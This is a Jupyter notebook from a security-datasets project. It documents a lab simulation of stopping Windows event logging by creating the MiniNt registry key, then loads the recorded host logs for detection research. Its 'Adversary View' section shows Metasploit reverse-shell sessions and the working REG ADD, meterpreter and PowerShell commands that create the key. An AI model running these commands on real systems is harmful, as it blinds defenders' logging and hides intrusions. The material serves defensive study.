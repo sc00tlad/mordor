{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "5ccbefa2",
   "metadata": {},
   "source": [
    "# Stopping Event Logging via Creation of MiniNt Registry Key"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "91163acd",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6539572e",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Jose Rodriguez @Cyb3rPandaH |\n",
    "| Creation Date     | 2022/08/03 |\n",
    "| Modification Date | 2022/08/03 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1562.002](https://attack.mitre.org/techniques/T1562/002) |\n",
    "| Tags              | reg,powershell,eventlog,minint |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cd17bab6",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "After getting an elevated meterpreter session, we added the MiniNt registry key in the following hives HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control and HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control. After rebooting the system and trying to access event logs trough the Event Viewer application, we got the following message Event Viewer cannot open the event log or custom view. Verify that Event Log service is running or query is too long. The request is not supported (50). We have simulated this attack using 3 different procedures REG command via cmd.exe, REG meterpreter command (Metasploit), and the PowerShell module (Metasploit). These datasets describe the before-rebooitng phase of the simulation, and they were generated using a Windows 10 Pro Evaluation edition (Version:1903,OS Build:18362.30)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "15cabb39",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bb685a69",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/reg_stop_event_logging_controlset_minint_key.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/reg_stop_event_logging_controlset_minint_key.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/reg_stop_event_logging_controlset001_minint_key.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/reg_stop_event_logging_controlset001_minint_key.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_stop_event_logging_controlset_minint_key.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_stop_event_logging_controlset_minint_key.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_stop_event_logging_controlset001_minint_key.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_stop_event_logging_controlset001_minint_key.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_stop_event_logging_controlset_minint_key.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_stop_event_logging_controlset_minint_key.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_stop_event_logging_controlset001_minint_key.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_stop_event_logging_controlset001_minint_key.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b3e7f468",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9d6f1cdc",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "398f3739",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | cmd | [cmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmd) |\n",
    "| Manual | Metasploit | [reg](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/base/sessions/command_shell.rb) |\n",
    "| Manual | Metasploit | [powershell](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/post/windows/powershell.rb) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "805d0df0",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "**** Using reg command via cmd.exe:\n",
    "\n",
    "msf6 exploit(multi/handler) > run \n",
    "\n",
    "[*] Started HTTPS reverse handler on https://192.168.56.40:8443 \n",
    "[*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: vtlafkal) Staging x64 payload (201308 bytes) ... \n",
    "[*] Meterpreter session 11 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-03 22:22:26 -0400 \n",
    "\n",
    "meterpreter > shell \n",
    "\n",
    "Process 8784 created. \n",
    "Channel 1 created. \n",
    "Microsoft Windows [Version 10.0.18362.30] \n",
    "(c) 2019 Microsoft Corporation. All rights reserved.  \n",
    "\n",
    "C:\\Users\\IT01-Pedro\\Downloads>REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt \n",
    "\n",
    "REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt \n",
    "The operation completed successfully. \n",
    "\n",
    "C:\\Users\\IT01-Pedro\\Downloads> \n",
    "\n",
    "**** Using reg meterpreter command:\n",
    "\n",
    "msf6 exploit(multi/handler) > run \n",
    "\n",
    "[*] Started HTTPS reverse handler on https://192.168.56.40:8443 \n",
    "[*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: y2cffmed) Staging x64 payload (201308 bytes) ... \n",
    "[*] Meterpreter session 5 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-03 19:01:55 -0400       \n",
    "\n",
    "meterpreter > reg createkey -k 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt' \n",
    "\n",
    "Successfully created key: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt \n",
    "\n",
    "meterpreter > \n",
    "\n",
    "**** Using PowerShell module: \n",
    "\n",
    "msf6 exploit(multi/handler) > run \n",
    "\n",
    "[*] Started HTTPS reverse handler on https://192.168.56.40:8443 \n",
    "[*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: 9203cnga) Staging x64 payload (201308 bytes) ... \n",
    "[*] Meterpreter session 9 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-03 19:43:05 -0400 \n",
    "\n",
    "meterpreter > load powershell \n",
    "\n",
    "Loading extension powershell...Success. \n",
    "\n",
    "meterpreter > powershell_execute \"New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\MiniNt\" \n",
    "\n",
    "[+] Command execution completed: \n",
    "\n",
    "    Hive: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control \n",
    "\n",
    "Name                           Property \n",
    "----                           -------- \n",
    "MiniNt \n",
    "\n",
    "meterpreter > \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ac9158ee",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6607900f",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "228c4348",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/reg_stop_event_logging_controlset_minint_key.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7089a01c",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b60b30b",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ccb0b5d7",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5c2298f8",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b4b64de2",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://www.quppa.net/blog/2016/04/14/beware-of-the-minint-registry-key/](https://www.quppa.net/blog/2016/04/14/beware-of-the-minint-registry-key/) \n",
    "* [https://twitter.com/0gtweet/status/1182516740955226112](https://twitter.com/0gtweet/status/1182516740955226112) \n",
    "* [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-item?view=powershell-7.2](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-item?view=powershell-7.2) \n",
    "* [https://www.offensive-security.com/metasploit-unleashed/interacting-registry/](https://www.offensive-security.com/metasploit-unleashed/interacting-registry/) \n",
    "* [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
